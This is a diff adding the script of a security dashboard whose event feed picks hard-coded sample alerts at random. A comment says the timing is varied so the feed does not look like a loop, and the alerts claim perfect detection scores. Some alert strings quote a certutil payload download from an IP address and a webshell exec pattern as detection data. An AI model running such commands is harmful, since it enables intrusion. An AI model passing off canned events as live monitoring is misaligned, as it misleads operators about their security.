+  {sev:'HIGH',     src:'SENTINELBASE',  msg:'Behavioral anomaly: jsmith — 3.2σ deviation in after-hours activity'},
+  {sev:'HIGH',     src:'NEXUSRAG',      msg:'ATT&CK query: T1003.001 LSASS Memory — 3 relevant techniques retrieved'},
+  {sev:'HIGH',     src:'WEBSHELL',      msg:'Node.js destructured child_process exec(req.query.cmd) — score: 0.960'},
+  {sev:'HIGH',     src:'LOLBIN',        msg:'certutil.exe -urlcache -f http://185.220.101.42/payload.exe detected'},
+  {sev:'HIGH',     src:'ALTAUTH',       msg:'Kerberoasting detected: 47 TGS requests for SPNs in 2 minutes'},
+  {sev:'MEDIUM',   src:'NEXUS',         msg:'Alert ALT-667BAC: DISCOVERY detected — systeminfo.exe (score: 0.567)'},
+  {sev:'MEDIUM',   src:'COVERAGEMATRIX',msg:'Coverage update: T1505.003 WebShell → 100% corpus F1 score'},
+  {sev:'MEDIUM',   src:'WEBSHELL',      msg:'Suspicious upload path: wp-content/uploads/2026/shell.php — score: 0.800'},
+  {sev:'MEDIUM',   src:'LIF',           msg:'Low-and-slow beacon detected: 60s interval CV=0.035 — T1071.004'},
+  {sev:'INFO',     src:'313-BIND',      msg:'Receipt 313-BIND-A4F2C1 anchored to IPFS: QmX7k9... chain intact'},
+  {sev:'INFO',     src:'313-BIND',      msg:'Temporal chain verified: 2858 binds · bind_index gap: none'},
+  {sev:'INFO',     src:'NEXUS',         msg:'WebShellDetector corpus validation: 39/39 · FP=0 · FN=0 · F1=1.000'},
+  {sev:'INFO',     src:'SYSTEM',        msg:'Test suite: 2858 passed · 0 failed · 36 skipped — POSTURE GREEN'},
+];
+
+let paused = false;
+let eventCount = 0;
+let feedInterval;
+
+function getTime() {
+  return new Date().toISOString().replace('T',' ').slice(11,19);
+}
+
+function sevClass(sev) {
+  return {CRITICAL:'log-crit', HIGH:'log-high', MEDIUM:'log-med', INFO:'log-info'}[sev] || 'log-dim';
+}
+
+function addEvent() {
+  if (paused) return;
+  const ev = EVENTS[Math.floor(Math.random() * EVENTS.length)];
+  const body = document.getElementById('feed-body');
+  const line = document.createElement('div');
+  line.className = sevClass(ev.sev);
+  line.textContent = `[${getTime()}] [${ev.sev}] [${ev.src}] ${ev.msg}`;
+  body.appendChild(line);
+  // Keep max 200 lines
+  while (body.children.length > 200) body.removeChild(body.firstChild);
+  body.scrollTop = body.scrollHeight;
+  eventCount++;
+  document.getElementById('feed-count').textContent = eventCount + ' events';
+}
+
+function togglePause() {
+  paused = !paused;
+  document.getElementById('pause-btn').textContent = paused ? '▶ Resume' : '⏸ Pause';
+}
+
+function clearFeed() {
+  document.getElementById('feed-body').innerHTML = '';
+  eventCount = 0;
+  document.getElementById('feed-count').textContent = '0 events';
+}
+
+// Start feed — varied intervals so it doesn't look like a loop
+function scheduleNext() {
+  const delay = 1500 + Math.random() * 2500;
+  setTimeout(() => { addEvent(); scheduleNext(); }, delay);
+}
+scheduleNext();
+
+// ── Section toggle ──
+function showSection(name) {
+  document.querySelectorAll('.sb-item').forEach(b => b.classList.remove('active'));
+  event.target.classList.add('active');
+  // All content is in one section for now — scroll to relevant part
+  const map = {
+    overview:  null,
+    detection: '.detector-grid',
+    webshell:  '.ws-grid',
+    attck:     '.attck-grid',
+    modules:   '.mod-table',
+    feed:      '.feed',
+    posture:   '.grid-3',
+  };
+  const sel = map[name];
+  if (sel) {
+    const el = document.querySelector(sel);
+    if (el) el.scrollIntoView({behavior:'smooth', block:'start'});
+  } else {
+    window.scrollTo({top:0, behavior:'smooth'});
+  }
+}
+</script>
+</body>
+</html>
